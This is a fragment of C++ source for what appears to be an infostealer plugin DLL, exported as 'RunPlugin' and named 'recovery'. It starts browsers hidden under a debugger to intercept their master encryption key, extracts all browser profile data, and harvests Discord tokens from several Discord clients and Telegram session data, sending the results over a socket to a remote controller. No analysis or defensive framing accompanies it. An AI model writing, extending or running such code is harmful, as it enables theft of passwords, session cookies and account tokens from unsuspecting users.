        std::vector<wchar_t> cmd_buffer(cmd_line.begin(), cmd_line.end()); cmd_buffer.push_back(0);
        if (CreateProcessW(NULL, cmd_buffer.data(), NULL, NULL, FALSE, DEBUG_PROCESS | CREATE_NO_WINDOW | CREATE_BREAKAWAY_FROM_JOB, NULL, NULL, &si, &pi)) {
            std::vector<uint8_t> v20_key = debug_loop_get_key(sock, pi.dwProcessId, config);
            TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
            if (!v20_key.empty()) {
                send_status(sock, "Master key intercepted for " + config.name);
                extract_all_profiles_data(sock, v20_key, config, user_data_dir);
            } else {
                send_status(sock, "Failed to intercept key for " + config.name + " (Timeout)");
                extract_all_profiles_data(sock, {}, config, user_data_dir);
            }
        } else {
            extract_all_profiles_data(sock, {}, config, user_data_dir);
        }
    }
    struct DiscordConfig { std::string name; std::wstring subdir; };
    std::vector<DiscordConfig> discords = { {"Discord", L"discord"}, {"Discord Canary", L"discordcanary"}, {"Discord PTB", L"discordptb"}, {"Lightcord", L"Lightcord"} };
    wchar_t* appdata; if (SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &appdata) == S_OK) {
        fs::path roaming(appdata); CoTaskMemFree(appdata);
        for (const auto& d : discords) { fs::path p = roaming / d.subdir; if (fs::exists(p)) extract_discord_tokens(sock, p.wstring(), d.name); }
    }
    extract_telegram_session(sock); send_status(sock, "Recovery completed.");
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    run_recovery(sock);
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmdJson) {
}
